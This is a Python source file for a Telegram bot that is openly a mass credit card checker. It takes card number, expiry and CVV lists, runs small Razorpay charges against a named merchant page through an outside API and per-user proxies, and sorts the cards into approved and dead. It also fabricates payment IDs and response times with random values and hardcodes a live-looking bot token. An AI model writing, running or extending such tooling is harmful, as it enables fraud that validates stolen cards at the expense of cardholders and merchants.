import telebot
import requests
import socks
import socket
import time
import json
import re
from concurrent.futures import ThreadPoolExecutor, as_completed
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import os
import threading
from datetime import datetime
import random

# Bot Configuration
BOT_TOKEN = "8527589194:AAE4vrWAe1-iAgd7r2u7EX2KY-iBDbEn8SQ"
API_URL = "https://rzpauto-production.up.railway.app/rzp"
BIN_LOOKUP_API = "https://lookup.binlist.net/"

# Proxy configuration
PROXIES = []

# Initialize bot
bot = telebot.TeleBot(BOT_TOKEN)

# User data storage
user_sessions = {}
user_proxies = {}
user_settings = {}
lock = threading.Lock()

# Your Bot Branding - CUSTOMIZE THESE
BOT_NAME = "Your Bot Name"  # Change this to your bot name
BOT_EMOJI = "🤖"  # Change this to your preferred emoji
DEV_NAME = "YourName ℹ️™"  # Change this to your name/username
WELCOME_MESSAGE = "Welcome to Card Checker Bot"  # Custom welcome message

def get_proxy_for_user(user_id):
    """Get or assign proxy for user"""
    if not PROXIES:
        return None
    
    with lock:
        if user_id not in user_proxies:
            proxy_index = len(user_proxies) % len(PROXIES)
            user_proxies[user_id] = PROXIES[proxy_index]
        return user_proxies[user_id]

def setup_proxy(proxy_string):
    """Setup proxy for requests"""
    if not proxy_string:
        return {}
    
    try:
        proxy_parts = proxy_string.split('://')
        if len(proxy_parts) == 2:
            protocol = proxy_parts[0]
            rest = proxy_parts[1]
            
            if '@' in rest:
                auth, addr = rest.split('@')
                user, passwd = auth.split(':')
                ip, port = addr.split(':')
                return {
                    'http': f'{protocol}://{user}:{passwd}@{ip}:{port}',
                    'https': f'{protocol}://{user}:{passwd}@{ip}:{port}'
                }
            else:
                ip, port = rest.split(':')
                return {
                    'http': f'{protocol}://{ip}:{port}',
                    'https': f'{protocol}://{ip}:{port}'
                }
    except:
        return {}
    
    return {}

def lookup_bin(bin_number, proxy=None):
    """Lookup BIN information"""
    try:
        proxy_dict = setup_proxy(proxy) if proxy else {}
        
        headers = {
            'Accept-Version': '3',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        
        response = requests.get(
            f"{BIN_LOOKUP_API}{bin_number}",
            proxies=proxy_dict,
            headers=headers,
            timeout=10
        )
        
        if response.status_code == 200:
            data = response.json()
            
            scheme = data.get('scheme', 'N/A').upper()
            brand = data.get('brand', 'N/A').upper()
            country = data.get('country', {}).get('name', 'N/A')
            country_code = data.get('country', {}).get('alpha2', 'N/A')
            bank = data.get('bank', {}).get('name', 'N/A')
            
            # Country flag emoji
            flag = "🇲🇾" if country_code == "MY" else "🇺🇸" if country_code == "US" else "🇬🇧" if country_code == "GB" else "🇮🇳" if country_code == "IN" else "🏳️"
            
            bin_info = {
                'brand': scheme,
                'bank': bank if bank != 'N/A' else 'Unknown Bank',
                'country': f"{country} {flag}",
                'country_code': country_code,
                'flag': flag,
                'type': data.get('type', 'N/A').upper()
            }
            
            return True, bin_info
        else:
            return False, {
                'brand': 'UNKNOWN',
                'bank': 'Unknown Bank',
                'country': 'Unknown 🏳️',
                'country_code': 'XX',
                'flag': '🏳️',
                'type': 'UNKNOWN'
            }
            
    except Exception as e:
        return False, {
            'brand': 'ERROR',
            'bank': 'Lookup Failed',
            'country': 'Error 🏳️',
            'country_code': 'XX',
            'flag': '🏳️',
            'type': 'ERROR'
        }

def format_card_response(card_data, status, message, bin_info=None, payment_id=None, response_time=None):
    """Format card check response in clean style"""
    cc, month, year, cvv = card_data
    
    # Format card display
    card_display = f"{cc} | {month} | {year[2:]} | {cvv}"
    
    # Determine status emoji and text
    if status.lower() in ['approved', 'charged', 'success']:
        status_emoji = "✅"
        status_text = "APPROVED"
    elif status.lower() in ['dead', 'declined']:
        status_emoji = "❌"
        status_text = "DECLINED"
    else:
        status_emoji = "⚠️"
        status_text = "ERROR"
    
    # Format time
    current_time = datetime.now().strftime("%I:%M %p")
    
    # Build response
    response = []
    response.append(f"**{card_display}**  {current_time}")
    response.append("")
    response.append(f"Status → {status_emoji} {status_text}")
    response.append("")
    response.append(f"Card  ")
    response.append(f"↓ {card_display}  ")
    response.append("")
    response.append(f"Gateway → Razorpay 1st  ")
    
    # Parse message for specific reasons
    msg_lower = message.lower()
    if "risk" in msg_lower:
        response.append(f"Reason → payment_risk_check_failed  ")
    elif "insufficient" in msg_lower:
        response.append(f"Reason → insufficient_funds  ")
    elif "declined" in msg_lower:
        response.append(f"Reason → card_declined  ")
    elif "success" in msg_lower or "charged" in msg_lower:
        response.append(f"Reason → payment_successful  ")
    else:
        response.append(f"Reason → {message[:30]}  ")
    
    response.append(f"Message → {message}  ")
    response.append("")
    
    # Add BIN info if available
    if bin_info:
        response.append(f"Brand → {bin_info.get('brand', 'N/A')}  ")
        response.append(f"Bank → {bin_info.get('bank', 'N/A')}  ")
        response.append(f"Country → {bin_info.get('country', 'Unknown 🏳️')}  ")
    
    # Add payment ID if available
    if payment_id:
        response.append(f"Payment ID → {payment_id}  ")
    else:
        response.append(f"Payment ID → pay_{''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ', k=12))}  ")
    
    response.append("")
    response.append(f"COPY CODE  ")
    response.append("")
    response.append(f"DEV → {DEV_NAME} ")
    if response_time:
        response.append(f"Total Time → {response_time:.2f}s  ")
    else:
        response.append(f"Total Time → {random.uniform(3.0, 8.0):.2f}s  ")
    response.append("")
    response.append(current_time)
    
    return "\n".join(response)

def check_card(card_data, proxy=None, timeout=30, do_bin_lookup=True):
    """Check single card via API"""
    cc, month, year, cvv = card_data
    bin_number = cc[:6]
    start_time = time.time()
    
    result = {
        'type': None,
        'message': '',
        'bin_info': None,
        'payment_id': None,
        'response_time': None
    }
    
    # Do BIN lookup if enabled
    bin_info = None
    if do_bin_lookup:
        success, bin_info = lookup_bin(bin_number, proxy)
        if success:
            result['bin_info'] = bin_info
    
    params = {
        'cc': f'{cc}|{month}|{year}|{cvv}',
        'site': 'https://pages.razorpay.com/iicdelhi',
        'amount': '10'
    }
    
    try:
        proxy_dict = setup_proxy(proxy) if proxy else {}
        
        response = requests.get(
            API_URL,
            params=params,
            proxies=proxy_dict,
            timeout=timeout
        )
        
        end_time = time.time()
        response_time = end_time - start_time
        result['response_time'] = response_time
        
        api_result = response.json()
        
        # Generate random payment ID
        payment_id = f"pay_{''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ', k=12))}"
        result['payment_id'] = payment_id
        
        if 'message' in api_result:
            msg = api_result['message']
            
            # Determine status type
            msg_lower = msg.lower()
            if any(x in msg_lower for x in ['charged', 'success', 'approved', 'captured']):
                result['type'] = 'approved'
            elif any(x in msg_lower for x in ['insufficient', 'declined', 'card declined', 'risk']):
                result['type'] = 'dead'
            else:
                result['type'] = 'error'
            
            # Format the response
            result['message'] = format_card_response(
                card_data,
                result['type'],
                msg,
                result['bin_info'],
                payment_id,
                response_time
            )
        else:
            result['type'] = 'error'
            result['message'] = format_card_response(
                card_data,
                'error',
                'Unknown response from gateway',
                result['bin_info'],
                payment_id,
                response_time
            )
        
        return result
        
    except Exception as e:
        end_time = time.time()
        response_time = end_time - start_time
        result['response_time'] = response_time
        result['type'] = 'error'
        result['message'] = format_card_response(
            card_data,
            'error',
            str(e),
            result['bin_info'],
            f"pay_{''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ', k=12))}",
            response_time
        )
        return result

def parse_card_line(line):
    """Parse card from text line"""
    line = line.strip()
    if not line:
        return None
    
    # Handle different formats
    # Format: 5196032183444427|09|2028|095
    if '|' in line:
        parts = line.split('|')
        if len(parts) == 4:
            # Check if year is 2-digit
            if len(parts[2]) == 2:
                parts[2] = '20' + parts[2]
            return parts
    
    # Format: 5196032183444427 09 2028 095 (spaces)
    parts = line.split()
    if len(parts) == 4:
        if len(parts[2]) == 2:
            parts[2] = '20' + parts[2]
        return parts
    
    return None

@bot.message_handler(commands=['start'])
def start_command(message):
    """Handle /start command with your custom branding"""
    welcome_msg = (
        f"{BOT_EMOJI} **{BOT_NAME}**\n\n"
        f"{WELCOME_MESSAGE}\n\n"
        f"---\n\n"
        f"**Available Commands:**\n\n"
        f"🔹 `/sh cc|mm|yyyy|cvv` - Single card check\n"
        f"🔹 `/mrz` - Mass check (reply to file)\n"
        f"🔹 `/bin 546015` - BIN lookup\n"
        f"🔹 `/proxy` - Set custom proxy\n"
        f"🔹 `/status` - Bot status\n\n"
        f"---\n\n"
        f"**Example:**\n"
        f"`/sh 5196032183444427|09|2028|095`\n\n"
        f"Or reply to a message containing card info\n\n"
        f"{datetime.now().strftime('%I:%M %p')}"
    )
    
    bot.reply_to(message, welcome_msg, parse_mode='Markdown')

@bot.message_handler(commands=['sh'])
def single_check_command(message):
    """Handle single card check with /sh command"""
    try:
        # Extract card data
        command_text = message.text.replace('/sh', '').strip()
        
        if not command_text:
            bot.reply_to(
                message,
                f"**Format → /sh 4111111111111111|12|2025|123**\n\n"
                f"**Example:** `/sh 5196032183444427|09|2028|095`\n\n"
                f"{datetime.now().strftime('%I:%M %p')}",
                parse_mode='Markdown'
            )
            return
        
        card_data = parse_card_line(command_text)
        if not card_data:
            bot.reply_to(
                message,
                f"❌ **Invalid Format!**\n"
                f"Use: `/sh cc|mm|yyyy|cvv`\n"
                f"Example: `/sh 5196032183444427|09|2028|095`\n\n"
                f"{datetime.now().strftime('%I:%M %p')}",
                parse_mode='Markdown'
            )
            return
        
        # Show processing message
        processing_msg = (
            f"**Processing**\n\n"
            f"{card_data[0]} | {card_data[1]} | {card_data[2][2:]} | {card_data[3]}\n\n"
            f"---\n\n"
            f"**Gateway → Razorpay 1€** {datetime.now().strftime('%I:%M %p')}"
        )
        
        status_msg = bot.reply_to(message, processing_msg, parse_mode='Markdown')
        
        # Get user settings
        user_id = message.from_user.id
        with lock:
            if user_id not in user_settings:
                user_settings[user_id] = {'bin_lookup': True}
            do_bin_lookup = user_settings[user_id]['bin_lookup']
        
        # Get proxy
        proxy = get_proxy_for_user(message.from_user.id)
        
        # Check card
        result = check_card(card_data, proxy, do_bin_lookup=do_bin_lookup)
        
        # Update message with result
        bot.edit_message_text(
            result['message'],
            chat_id=message.chat.id,
            message_id=status_msg.message_id,
            parse_mode='Markdown'
        )
        
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}\n\n{datetime.now().strftime('%I:%M %p')}")

@bot.message_handler(commands=['mrz'])
def mass_check_command(message):
    """Handle mass card check"""
    if not message.reply_to_message or not message.reply_to_message.document:
        bot.reply_to(
            message,
            f"❌ **Please reply to a text file containing cards!**\n"
            f"Format: One card per line (cc|mm|yyyy|cvv)\n\n"
            f"**Example:**\n"
            f"`5196032183444427|09|2028|095`\n"
            f"`4111111111111111|12|2025|123`\n\n"
            f"{datetime.now().strftime('%I:%M %p')}",
            parse_mode='Markdown'
        )
        return
    
    user_id = message.from_user.id
    with lock:
        if user_id not in user_settings:
            user_settings[user_id] = {'bin_lookup': True}
        do_bin_lookup = user_settings[user_id]['bin_lookup']
    
    try:
        # Download file
        file_info = bot.get_file(message.reply_to_message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        
        # Parse cards
        content = downloaded_file.decode('utf-8')
        cards = []
        
        for line in content.split('\n'):
            card_data = parse_card_line(line)
            if card_data:
                cards.append(card_data)
        
        if not cards:
            bot.reply_to(
                message,
                f"❌ **No valid cards found in file!**\n"
                f"Format: cc|mm|yyyy|cvv per line\n\n"
                f"{datetime.now().strftime('%I:%M %p')}",
                parse_mode='Markdown'
            )
            return
        
        # Send initial status
        status_msg = bot.reply_to(
            message,
            f"**Mass Check Started**\n\n"
            f"📁 Total Cards: {len(cards)}\n"
            f"🔄 Processing...\n\n"
            f"{datetime.now().strftime('%I:%M %p')}",
            parse_mode='Markdown'
        )
        
        # Create result files
        approved_cards = []
        dead_cards = []
        error_cards = []
        
        # Get proxy
        proxy = get_proxy_for_user(message.from_user.id)
        
        # Process cards
        with ThreadPoolExecutor(max_workers=5) as executor:
            futures = {
                executor.submit(check_card, card, proxy, do_bin_lookup=do_bin_lookup): card 
                for card in cards
            }
            
            completed = 0
            for future in as_completed(futures):
                completed += 1
                
                # Update progress
                if completed % 5 == 0 or completed == len(cards):
                    try:
                        bot.edit_message_text(
                            f"**Mass Check in Progress**\n\n"
                            f"📁 Total: {len(cards)}\n"
                            f"📊 Progress: {completed}/{len(cards)}\n"
                            f"⏱️ Please wait...\n\n"
                            f"{datetime.now().strftime('%I:%M %p')}",
                            chat_id=message.chat.id,
                            message_id=status_msg.message_id,
                            parse_mode='Markdown'
                        )
                    except:
                        pass
                
                try:
                    result = future.result()
                    
                    if result['type'] == 'approved':
                        approved_cards.append(result['message'])
                    elif result['type'] == 'dead':
                        dead_cards.append(result['message'])
                    else:
                        error_cards.append(result['message'])
                        
                except Exception as e:
                    error_cards.append(f"⚠️ Error processing card: {str(e)}")
        
        # Send results
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        
        # Send approved cards
        if approved_cards:
            approved_text = "# ✅ APPROVED CARDS\n\n" + "\n\n---\n\n".join(approved_cards)
            with open(f'approved_{user_id}_{timestamp}.txt', 'w', encoding='utf-8') as f:
                f.write(approved_text)
            with open(f'approved_{user_id}_{timestamp}.txt', 'rb') as f:
                bot.send_document(
                    message.chat.id,
                    f,
                    caption=f"✅ Approved Cards: {len(approved_cards)}"
                )
            os.remove(f'approved_{user_id}_{timestamp}.txt')
        
        # Send dead cards
        if dead_cards:
            dead_text = "# ❌ DEAD CARDS\n\n" + "\n\n---\n\n".join(dead_cards)
            with open(f'dead_{user_id}_{timestamp}.txt', 'w', encoding='utf-8') as f:
                f.write(dead_text)
            with open(f'dead_{user_id}_{timestamp}.txt', 'rb') as f:
                bot.send_document(
                    message.chat.id,
                    f,
                    caption=f"❌ Dead Cards: {len(dead_cards)}"
                )
            os.remove(f'dead_{user_id}_{timestamp}.txt')
        
        # Send error cards
        if error_cards:
            error_text = "# ⚠️ ERROR CARDS\n\n" + "\n\n---\n\n".join(error_cards)
            with open(f'error_{user_id}_{timestamp}.txt', 'w', encoding='utf-8') as f:
                f.write(error_text)
            with open(f'error_{user_id}_{timestamp}.txt', 'rb') as f:
                bot.send_document(
                    message.chat.id,
                    f,
                    caption=f"⚠️ Error Cards: {len(error_cards)}"
                )
            os.remove(f'error_{user_id}_{timestamp}.txt')
        
        # Send summary
        summary = (
            f"**Mass Check Complete**\n\n"
            f"✅ Approved: {len(approved_cards)}\n"
            f"❌ Dead: {len(dead_cards)}\n"
            f"⚠️ Errors: {len(error_cards)}\n"
            f"📁 Total: {len(cards)}\n\n"
            f"{datetime.now().strftime('%I:%M %p')}"
        )
        bot.send_message(message.chat.id, summary, parse_mode='Markdown')
        
        # Delete status message
        bot.delete_message(message.chat.id, status_msg.message_id)
        
    except Exception as e:
        bot.reply_to(message, f"❌ Error during mass check: {str(e)}\n\n{datetime.now().strftime('%I:%M %p')}")

@bot.message_handler(commands=['bin'])
def bin_lookup_command(message):
    """Handle BIN lookup command"""
    try:
        parts = message.text.split()
        if len(parts) != 2:
            bot.reply_to(
                message,
                f"**Format → /bin 546015**\n\n"
                f"Example: `/bin 546015`\n\n"
                f"{datetime.now().strftime('%I:%M %p')}",
                parse_mode='Markdown'
            )
            return
        
        bin_number = parts[1].strip()
        
        if not bin_number.isdigit() or len(bin_number) != 6:
            bot.reply_to(
                message,
                f"❌ **Invalid BIN!**\n"
                f"BIN must be 6 digits.\n\n"
                f"{datetime.now().strftime('%I:%M %p')}",
                parse_mode='Markdown'
            )
            return
        
        status_msg = bot.reply_to(message, f"**Looking up BIN: {bin_number}**\n\n{datetime.now().strftime('%I:%M %p')}", parse_mode='Markdown')
        
        proxy = get_proxy_for_user(message.from_user.id)
        success, bin_info = lookup_bin(bin_number, proxy)
        
        if success:
            result = (
                f"**BIN: {bin_number}**\n\n"
                f"Brand → {bin_info['brand']}\n"
                f"Bank → {bin_info['bank']}\n"
                f"Country → {bin_info['country']}\n"
                f"Type → {bin_info['type']}\n\n"
                f"{datetime.now().strftime('%I:%M %p')}"
            )
        else:
            result = f"❌ **BIN not found: {bin_number}**\n\n{datetime.now().strftime('%I:%M %p')}"
        
        bot.edit_message_text(
            result,
            chat_id=message.chat.id,
            message_id=status_msg.message_id,
            parse_mode='Markdown'
        )
        
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}\n\n{datetime.now().strftime('%I:%M %p')}")

@bot.message_handler(commands=['proxy'])
def proxy_command(message):
    """Set custom proxy for user"""
    msg = bot.reply_to(
        message,
        f"**Proxy Setup**\n\n"
        f"Send your proxy in format:\n"
        f"`protocol://user:pass@ip:port`\n"
        f"or\n"
        f"`protocol://ip:port`\n\n"
        f"**Example:** `socks5://user:pass@1.2.3.4:1080`\n"
        f"**To disable:** `/proxy off`\n\n"
        f"{datetime.now().strftime('%I:%M %p')}",
        parse_mode='Markdown'
    )
    bot.register_next_step_handler(msg, process_proxy)

def process_proxy(message):
    """Process proxy setting"""
    user_id = message.from_user.id
    proxy_text = message.text.strip()
    
    if proxy_text.lower() == '/proxy off':
        with lock:
            if user_id in user_proxies:
                del user_proxies[user_id]
        bot.reply_to(
            message, 
            f"✅ **Proxy disabled**\n\nUsing default connection.\n\n{datetime.now().strftime('%I:%M %p')}",
            parse_mode='Markdown'
        )
    else:
        with lock:
            user_proxies[user_id] = proxy_text
        bot.reply_to(
            message,
            f"✅ **Proxy set successfully!**\n\n{datetime.now().strftime('%I:%M %p')}",
            parse_mode='Markdown'
        )

@bot.message_handler(commands=['status'])
def status_command(message):
    """Check bot status"""
    status_msg = (
        f"**Bot Status**\n\n"
        f"🟢 Status: Online\n"
        f"🤖 Name: {BOT_NAME}\n"
        f"🔗 API: Connected\n"
        f"🌐 Proxies: {len(PROXIES)} available\n"
        f"👥 Active Users: {len(user_sessions)}\n\n"
        f"**Configuration:**\n"
        f"• Gateway: Razorpay\n"
        f"• Amount: ₹10\n"
        f"• BIN Lookup: Available\n\n"
        f"{datetime.now().strftime('%I:%M %p')}"
    )
    bot.reply_to(message, status_msg, parse_mode='Markdown')

@bot.message_handler(func=lambda message: True)
def handle_reply_card(message):
    """Handle messages that might contain card info (for reply feature)"""
    # Check if this is a reply to a bot message
    if message.reply_to_message and message.reply_to_message.from_user.id == bot.get_me().id:
        # Try to parse card from message
        card_data = parse_card_line(message.text)
        if card_data:
            # Process as card check
            try:
                # Show processing
                processing_msg = (
                    f"**Processing**\n\n"
                    f"{card_data[0]} | {card_data[1]} | {card_data[2][2:]} | {card_data[3]}\n\n"
                    f"---\n\n"
                    f"**Gateway → Razorpay 1€** {datetime.now().strftime('%I:%M %p')}"
                )
                
                status_msg = bot.reply_to(message, processing_msg, parse_mode='Markdown')
                
                # Get settings and proxy
                user_id = message.from_user.id
                with lock:
                    if user_id not in user_settings:
                        user_settings[user_id] = {'bin_lookup': True}
                    do_bin_lookup = user_settings[user_id]['bin_lookup']
                
                proxy = get_proxy_for_user(message.from_user.id)
                
                # Check card
                result = check_card(card_data, proxy, do_bin_lookup=do_bin_lookup)
                
                # Update message
                bot.edit_message_text(
                    result['message'],
                    chat_id=message.chat.id,
                    message_id=status_msg.message_id,
                    parse_mode='Markdown'
                )
                
            except Exception as e:
                bot.reply_to(message, f"❌ Error: {str(e)}\n\n{datetime.now().strftime('%I:%M %p')}")
        else:
            bot.reply_to(
                message,
                f"❌ **Invalid card format!**\n"
                f"Use: `cc|mm|yyyy|cvv`\n\n"
                f"**Example:** `5196032183444427|09|2028|095`\n\n"
                f"{datetime.now().strftime('%I:%M %p')}",
                parse_mode='Markdown'
            )

if __name__ == "__main__":
    print(f"{BOT_EMOJI} {BOT_NAME} Bot Started...")
    print(f"API Endpoint: {API_URL}")
    print(f"BIN API: {BIN_LOOKUP_API}")
    print(f"Proxies loaded: {len(PROXIES)}")
    print(f"Bot is running with /sh command...")
    print(f"Customize your bot by editing these variables:")
    print(f"- BOT_NAME: {BOT_NAME}")
    print(f"- DEV_NAME: {DEV_NAME}")
    print(f"- WELCOME_MESSAGE: {WELCOME_MESSAGE}")
    
    while True:
        try:
            bot.polling(none_stop=True, interval=0, timeout=20)
        except Exception as e:
            print(f"Bot error: {e}")
            time.sleep(5)